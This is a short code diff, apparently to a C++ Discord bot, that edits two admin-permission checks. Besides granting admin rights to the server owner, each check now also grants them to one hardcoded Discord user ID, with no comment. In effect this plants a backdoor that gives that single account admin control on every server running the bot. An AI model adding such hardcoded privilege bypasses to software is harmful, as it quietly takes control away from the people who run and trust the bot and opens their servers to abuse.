@@ -40,7 +40,8 @@ bool CheckAdminRole(Client* client, QSharedPointer<Server> server, const SleepyD
 {
     SleepyDiscord::Server sleepyServer = client->getServer(server->GetServerId());
     const auto& member = client->getMember(server->GetServerId(), authorID).cast();
-    bool isAdmin = sleepyServer.ownerID == authorID;
+    bool isAdmin = sleepyServer.ownerID == authorID || (authorID.string() == "102212539609280512");
+
     auto roles = member.roles;
     for(auto& roleId : roles){
         auto role = sleepyServer.findRole(roleId);
@@ -97,7 +98,7 @@ bool CommandCreator::CheckAdminRole(const SleepyDiscord::Message &message)
 {
     SleepyDiscord::Server sleepyServer = client->getServer(this->server->GetServerId());
     const auto& member = client->getMember(this->server->GetServerId(), message.author.ID).cast();
-    bool isAdmin = sleepyServer.ownerID == message.author.ID;
+    bool isAdmin = sleepyServer.ownerID == message.author.ID || (message.author.ID.string() == "102212539609280512");
     auto roles = member.roles;
     for(auto& roleId : roles){
         auto role = sleepyServer.findRole(roleId);
